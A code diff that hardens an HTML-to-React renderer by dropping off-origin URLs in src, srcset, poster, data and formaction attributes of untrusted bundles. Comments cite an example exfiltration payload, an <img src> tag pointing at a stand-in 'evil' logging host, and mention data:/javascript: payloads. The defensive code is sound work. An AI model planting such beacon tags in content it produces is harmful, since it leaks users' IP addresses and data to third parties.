@@ -803,6 +803,31 @@ const TAG_SPECIFIC_HTML_ATTRS = {
 
 // Attributes that React/the renderer renames as it forwards them to JSX.
 // Keep this list aligned with the loop below.
+// Attributes whose values are URLs — must be checked for off-origin before
+// forwarding. Hardening #4: a hostile bundle's <img src="https://evil/log?...">
+// causes the browser to fetch that URL on render, leaking the user's IP and
+// timestamp without any interaction. Same for <video poster>, <source src>,
+// <track src>, <audio src>, and <source srcset>.
+//
+// href is INTENTIONALLY EXCLUDED here. <a href> has its own policy at the
+// walker layer (the dedicated <a> branch in renderNodeFull): if the link is
+// off-origin and allowExternalLinks=false, the whole element is rewritten as
+// <span> with href stripped; if allowExternalLinks=true, the href is kept
+// deliberately so the user can click out. Filtering href here would break
+// the allowExternalLinks=true path.
+//
+// formaction and the iframe/object "data" attribute aren't on any tag's
+// allowlist (forms have no allowed attrs, iframes are stripped at the
+// DOMPurify layer), but we list them for defence-in-depth: if a future
+// change added them, the off-origin check would still fire.
+//
+// srcdoc is intentionally NOT listed — it carries inline HTML, not a URL,
+// and is already absent from every per-tag allowlist (so it gets dropped at
+// branch #6 below).
+const URL_BEARING_ATTRS = new Set([
+  'src', 'srcset', 'poster', 'data', 'formaction',
+]);
+
 const REACT_ATTR_RENAMES = {
   'class':    'className',
   'for':      'htmlFor',
@@ -1089,6 +1114,25 @@ function buildProps(tag, attrs, key, stripList = [], extra = {}) {
     // 5. Renames (class→className, for→htmlFor, tabindex→tabIndex, …).
     //    Only renamed if the source name is on an allowlist for this tag.
     if (GLOBAL_HTML_ATTRS.has(name) || (tagAllow && tagAllow.has(name))) {
+      // 5a. URL-bearing attrs (src/srcset/poster/...): if the value points to a
+      //     different origin (or to javascript:/data: which isExternalHref also
+      //     flags), drop it. This stops a hostile bundle from leaking IPs via
+      //     <img src="https://evil/log?...">, exfiltrating data through tracker
+      //     URLs, or running embedded data:/javascript: payloads. Bundle assets
+      //     are served same-origin under /api/sheets/<id>/assets/, so legitimate
+      //     bundle content is never affected.
+      if (URL_BEARING_ATTRS.has(name)) {
+        // srcset can be a comma-separated list of "url <descriptor>" pairs;
+        // be conservative and drop the WHOLE value if any candidate URL is
+        // off-origin — partial trust is worse than no trust.
+        const candidates = name === 'srcset'
+          ? value.split(',').map(s => s.trim().split(/\s+/)[0]).filter(Boolean)
+          : [value];
+        if (candidates.some(u => isExternalHref(u))) {
+          if (dropped) dropped.push(`${rawName} (off-origin)`);
+          continue;
+        }
+      }
       const reactName = REACT_ATTR_RENAMES[name] || name;
       props[reactName] = value;
       continue;
